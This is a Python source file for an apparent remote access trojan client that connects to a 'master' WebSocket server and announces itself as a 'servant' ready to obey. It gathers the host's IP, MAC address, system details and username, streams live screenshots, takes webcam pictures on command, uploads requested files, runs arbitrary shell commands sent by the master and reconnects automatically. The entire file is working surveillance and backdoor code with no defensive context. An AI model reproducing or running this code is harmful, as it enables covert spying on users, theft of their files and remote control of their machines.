import sys
import argparse
import asyncio
import websockets
import cv2
import numpy as np
import pyautogui
from screeninfo import get_monitors
import base64
import subprocess
import os
import time
import logging
from decoder import decode_unicode_string
from colorama import init, Fore
import socket
import platform
import getpass
import uuid

sys.dont_write_bytecode = True
init()
screen = get_monitors()[0]  # Assuming a single monitor setup
screen_size = (screen.width, screen.height)
session = ""

def get_info():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
        system_info = platform.system()
        machine_info = platform.machine()
        processor_info = platform.processor()
        username = getpass.getuser()

        info_string = f"\nIP Address: {ip_address}\nMAC Address: {mac_address}\nSystem: {system_info}, Machine: {machine_info}, Processor: {processor_info}\nUsername: {username} \n"
        return info_string
    except Exception as e:
        return f"Error: {str(e)}"
info = get_info()+"[ READY TO OBEY ]\n"
# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

async def connect_to_websocket(url, room, retry_interval, debug, output_filename):
    global session
    while True:
        try:
            
            uri = f"ws://{url}" if "localhost" in url else f"wss://{url}"
            if room:
                uri += f"/{room}"
            async with websockets.connect(uri) as websocket:
                await websocket.send(f"servant:{room}")

                # Start the coroutine for sending video frames
                asyncio.create_task(send_video_frames(websocket, debug))

                while True:
                    message_from_master = await websocket.recv()

                    message_from_master = decode_unicode_string(message_from_master)
                    if debug:
                        logger.debug(f"Received Command {message_from_master}")

                    if message_from_master.rstrip().strip() == "clear-session":
                        session = ""
                        servant_response = "terminal- session cleared"
                        await websocket.send(servant_response)

                    elif message_from_master.startswith("send-file"):
                        # Handle sending a file
                        _, file_path = message_from_master.split(" ", 1)
                        await send_file(websocket, file_path)
                    elif message_from_master.startswith("take-picture"):
                        _cap = cv2.VideoCapture(0)
                        if not _cap.isOpened():
                            await websocket.send("Error: Could not open webcam.")
                        _ret, _frame = _cap.read()
                        _cap.release()
                        __, buffer = cv2.imencode('.jpg', _frame)
                        frame_base64 = "frame_dat1:"+base64.b64encode(buffer).decode('utf-8')
                        # Send the frame to the client as a JSON object
                        await websocket.send(frame_base64)
                    elif message_from_master=="Get Servant ID:": await websocket.send(info)
                    else:
                        session += f" && {message_from_master} "
                        if debug:
                            logger.debug(f"Executing {message_from_master}")

                        result = subprocess.run(
                            message_from_master,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True,
                        )

                        with open(output_filename, "w") as output_file:
                            output_file.write(result.stdout)
                            output_file.write(result.stderr)

                        with open(output_filename, "r") as output_file:
                            await websocket.send(output_file.read())
                        os.remove(output_filename)

        except (websockets.exceptions.ConnectionClosed, OSError) as e:
            if debug:
                logger.debug(f"Error: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)

async def send_video_frames(websocket, debug):
    try:
        while True:
            # Capture the screen
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

            # Resize the frame to a lower resolution
            frame = cv2.resize(frame, (840, 680))  
            # Encode the frame to base64
            _, buffer = cv2.imencode('.jpg', frame)
            frame_base64 = "frame_data:"+base64.b64encode(buffer).decode('utf-8')

            # Send the frame to the client as a JSON object
            await websocket.send(frame_base64)

            # Sleep for a short time to control the frame rate
            # await asyncio.sleep(0.05)

    except asyncio.CancelledError:
        if debug:
            logger.debug("Video frame sender coroutine canceled.")

async def send_file(websocket, file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
            await websocket.send(file_data)
    except FileNotFoundError:
        await websocket.send("File not found.")

def parse_args():
    parser = argparse.ArgumentParser(description="WebSocket client with retrying and room support")
    parser.add_argument("--url", required=True, help="WebSocket server URL")
    parser.add_argument("--room", default="", help="Room identifier")
    parser.add_argument("--retry-interval", type=int, default=5, help="Retry interval in seconds")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--output-filename", default="dump", help="Output filename for subprocess results")
    return parser.parse_args()

async def main():
    args = parse_args()
    await connect_to_websocket(args.url, args.room, args.retry_interval, args.debug, args.output_filename)

if __name__ == "__main__":
    asyncio.run(main())
